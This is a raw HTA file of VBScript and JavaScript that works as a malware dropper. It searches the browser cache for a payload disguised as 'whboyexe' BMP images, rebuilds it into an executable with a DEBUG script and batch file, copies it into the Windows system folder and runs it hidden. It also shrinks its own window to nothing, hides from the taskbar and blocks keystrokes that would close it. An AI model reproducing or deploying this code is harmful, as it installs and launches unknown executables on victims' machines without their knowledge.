
<SCRIPT LANGUAGE="VBScript">
Option Explicit
Dim FSO,WSH,CACHE,str,sucess
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WSH = CreateObject("WScript.Shell")

sub FF
 SearchBMPFile fso.GetFolder(CACHE),"whboyexe[1].bmp"
 if sucess=0 then SearchBMPFile fso.GetFolder(CACHE),"whboyexe[2].bmp"
End sub

CACHE=wsh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache")
sucess=0



Function SearchBMPFile(Folder,fname)
   Dim SubFolder,File,Lt,tmp,winsys
   str=FSO.GetParentFolderName(folder) & "\" & folder.name & "\" & fname');
   if FSO.FileExists(str) then
      tmp=fso.GetSpecialFolder(2) & "\"
      winsys=fso.GetSpecialFolder(1) & "\"
      set File=FSO.GetFile(str)
      File.Copy(tmp & "tmp.dat")
      On Error Resume Next
      File.Delete
      if FSO.FileExists(str) then exit function
      set Lt=FSO.CreateTextFile(tmp & "tmp.in")
      Lt.WriteLine("rbx")
      Lt.WriteLine("0")
      Lt.WriteLine("rcx")
      '下面的数字是十六进制的EXE文件的大小
      Lt.WriteLine("2E49")
      Lt.WriteLine("w136")
      Lt.WriteLine("q")
      Lt.Close
      set Lt=FSO.CreateTextFile(tmp & "tmp.bat")
      Lt.WriteLine("@echo off")
      Lt.WriteLine("debug " & tmp & "tmp.dat <" & tmp & "tmp.in >" & tmp & "tmp.out")
      Lt.WriteLine("copy " & tmp & "tmp.dat " & winsys & "whboyexe.exe>" & tmp & "tmp.out")
      Lt.WriteLine("del " & tmp & "tmp.dat >" & tmp & "tmp.out")
      Lt.WriteLine("del " & tmp & "tmp.in >" & tmp & "tmp.out")
      Lt.WriteLine(winsys & "whboyexe.exe")
      Lt.Close
      WSH.Run tmp & "tmp.bat",false,6
      On Error Resume Next
      'FSO.GetFile(tmp & "tmp.bat").Delete
      sucess=1
      window.close ()
   end if
   If Folder.SubFolders.Count <> 0 Then
      For Each SubFolder In Folder.SubFolders
         SearchBMPFile SubFolder,fname
      Next
   End If
End Function
</script>

<SCRIPT language=javascript>
function F()
{
FF();
if (sucess==0) setTimeout("F()", 2000);
}
setTimeout("F()", 2000);
parent.moveTo((screen.width-0)/2,(screen.height-0)/2);
parent.resizeTo(0,0);
</SCRIPT>
</head>
<HTA:APPLICATION caption="no" border="none"
SHOWINTASKBAR="no">
<body bgcolor="#ffffff" text="#000000" scroll="no" leftmargin="2" topmargin="3" marginwidth="0" marginheight="0" oncontextmenu='self.event.returnvalue=0' onkeydown="javascript:if(event.keyCode==27 || event.keyCode==78 && event.ctrlKey)return false;">
</body>
</html>